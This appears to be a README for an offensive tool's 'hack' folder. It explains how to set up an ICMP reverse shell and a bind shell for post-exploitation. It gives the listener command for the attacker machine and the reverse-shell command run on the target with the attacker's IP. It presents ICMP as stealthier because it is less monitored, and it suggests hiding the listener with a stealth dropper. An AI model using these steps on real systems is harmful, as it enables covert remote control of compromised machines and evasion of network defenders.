# Hack

Some fun thing with `QueenSono`

## Reverse Shell
<h5 align="center">In <code>QueenSono/hack/reverse-shell</code></h5>

<p align="center"> It a "reverse shell" trough ICMP so it is quite ordinary if it takes time or if all commands are not well treated</p>

### Use case
***In Post exploitation phase:*** if ICMP is less monitored than other protocol (eg TCP), having a reverse shell trough `QueenSono` is more more stealthy.

#### How to do it
*> On the attacker machine:* Put your listener
```
./listener.sh <ip_listening_for_icmp>
```

*> On the target machine:* Provide the reverse shell
```
./reverse-shell.sh <ip_attacker> <ip_listening_for_icmp>
```


### Bindshell

Sometimes, and for the ***post exploitation*** phase it is more suited, you need a bind shell. That is to say the `listener` will be on the "compromised" machine and the attacker will "bind" this shell.

*Product placement: To be stealthly, you `listener` should use a dropper and hide its presence. You could find a stealth dropper example in [curlNExec](https://github.com/ariary/curlNexec) repo. Could I adapt it to use ICMP ? 🤔*
